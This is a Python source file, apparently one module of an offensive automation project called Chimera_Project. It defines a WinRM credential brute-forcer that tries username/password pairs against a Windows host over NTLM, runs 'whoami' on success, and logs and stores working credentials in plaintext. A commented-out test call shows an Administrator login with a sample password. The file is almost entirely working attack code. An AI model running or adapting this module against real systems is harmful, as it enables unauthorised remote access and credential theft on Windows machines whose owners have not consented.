import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import logging
import winrm # You'll need: pip install pywinrm

# Ensure the agent can find the core directory
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class WinRM_Bruteforcer:
    def __init__(self):
        self.agent_id = "45"
        self.name = "WinRM_Bruteforcer"
        self.db = ChimeraDB()
        
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)

    def attempt_login(self, target_ip, user, password):
        """Attempts to execute 'whoami' via WinRM to verify credentials."""
        self.logger.info(f"Testing WinRM: {user} on {target_ip}...")
        
        try:
            # Create a WinRM session
            session = winrm.Session(f'http://{target_ip}:5985/wsman', auth=(user, password), transport='ntlm')
            # Try to run a simple command
            result = session.run_cmd('whoami')
            
            if result.status_code == 0:
                self.logger.warning(f"[!!!] SUCCESSFUL WINRM LOGIN: {user}:{password}")
                self.db.report_finding(self.name, "WinRM_Credential", {
                    "ip": target_ip,
                    "user": user,
                    "password": password,
                    "output": result.std_out.decode().strip()
                })
                return True
        except Exception as e:
            # Usually fails due to '401 Unauthorized'
            return False

    def run(self):
        self.db.heartbeat(self.name)
        # Typically triggered after finding a Windows host with 5985 open
        # self.attempt_login("10.129.6.20", "Administrator", "Password123!")
        self.db.close()

if __name__ == "__main__":
    agent = WinRM_Bruteforcer()
    agent.run()
